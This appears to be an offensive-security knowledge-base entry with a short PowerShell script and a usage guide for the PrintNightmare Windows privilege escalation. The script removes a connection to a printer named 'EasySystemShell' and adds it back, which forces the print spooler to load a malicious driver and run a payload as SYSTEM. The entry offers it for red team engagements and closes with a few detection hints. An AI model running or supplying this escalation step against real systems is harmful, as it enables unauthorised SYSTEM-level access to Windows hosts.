---
id: fffa0eb2-8c85-451a-b64b-4280d9917cd7
name: powershell-script-to-remove-and-add-printernightmare-instance
type: code
language: ps1
verified: true
created_at: '2023-04-06T03:56:29.867288+00:00'
updated_at: '2023-04-10T20:37:34.443913+00:00'
platforms:
  - Windows
tags:
  - privilege-escalation
  - printer-nightmare
validated: true
---

# powershell-script-to-remove-and-add-printernightmare-instance

## Code

```powershell
PS C:\target> $serverName  = 'printer-installed-host'
PS C:\target> $printerName = 'EasySystemShell'
PS C:\target> $fullprinterName = '\\' + $serverName + '\' + $printerName + ' - ' + $(If ([System.Environment]::Is64BitOperatingSystem) {'x64'} Else {'x86'})
PS C:\target> Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue
PS C:\target> Add-Printer -ConnectionName $fullprinterName
```

## Description

This PowerShell script automates the removal and re-addition of a PrinterNightmare printer instance to trigger the malicious driver load and achieve privilege escalation. It dynamically appends the OS architecture to the printer name for compatibility.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $serverName | Target host or server name | 'printer-installed-host' |
| $printerName | Name of the malicious printer | 'EasySystemShell' |
| $fullprinterName | Constructed UNC path (auto-generated) | '\\\\printer-installed-host\\EasySystemShell - x64' |

## Usage

Execute this script on the target after deploying the driver with FakePrinter.exe. It unloads the printer to reset state, then reconnects to force spooler reload, executing the payload as SYSTEM. Ideal for local escalation in red team engagements.

## Detection

- Monitor PowerShell execution logs for Remove-Printer and Add-Printer calls (Event ID 4104 in Microsoft-Windows-PowerShell/Operational).
- Watch for rapid printer add/remove events in PrintService logs.
- Detect anomalous SYSTEM processes spawned from spoolsv.exe.

## Related

- [[procedures/PrinterNightmare-Privilege-Escalation]]
